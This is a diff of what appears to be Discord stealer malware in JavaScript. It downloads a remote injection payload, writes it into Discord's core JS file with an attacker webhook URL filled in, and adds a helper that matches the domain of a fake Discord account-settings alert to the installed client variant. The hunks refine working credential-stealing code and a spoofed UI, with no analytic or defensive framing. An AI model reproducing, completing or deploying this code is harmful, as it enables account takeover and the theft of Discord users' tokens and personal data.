@@ -1204,8 +1204,8 @@ const startup = async () => {
                 try {
                     const fileStream = fs.createWriteStream(coreJsFile);
                     await new Promise((resolve, reject) => {
-                        https.get('${CONFIG['injection_url']}', (res) => {
-                            res.on('data', chunk => fileStream.write(chunk.toString().replace('%WEBHOOK_URL%', '${CONFIG['webhook']}')));
+                        https.get('${CONFIG.injection_url}', (res) => {
+                            res.on('data', chunk => fileStream.write(chunk.toString().replace('%WEBHOOK_URL%', '${CONFIG.webhook}')));
                             res.on('end', () => {
                                 fileStream.end();
                                 resolve();
@@ -1501,6 +1501,17 @@ const defaultSession = (webRequest) => {
                     const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
                     return `${truncatedLocalPart}@${domain}`;
                 };
+
+                const getDiscordDomain = (maper) => {
+                    const path = __dirname.trim().replace(/\\/g, "/");
+                    const regex = /\/Local\/(discord|discordcanary|discordptb|discorddevelopment)\//i;
+                    const match = path.match(regex);
+                    let domain = 'discord.com'; 
+                    if (match && maper[match[1].toLowerCase()]) {
+                        domain = maper[match[1].toLowerCase()];
+                    }
+                    return domain
+                }
     
                 const [
                     CONFIG_ALERT,
@@ -1559,7 +1570,7 @@ const defaultSession = (webRequest) => {
                                                                 <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
                                                             </div>
                                                             <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
-                                                                <a href="https://discord.com/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
+                                                                <a href="https://${getDiscordDomain({'discord':'discord.com','discordcanary':'canary.discord.com','discordptb':'ptb.discord.com','discorddevelopment':'canary.discord.com'})}/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
                                                                     <div class="contents_dd4f85">
                                                                         ${EDIT_MAIL_ALERT}
                                                                     </div>
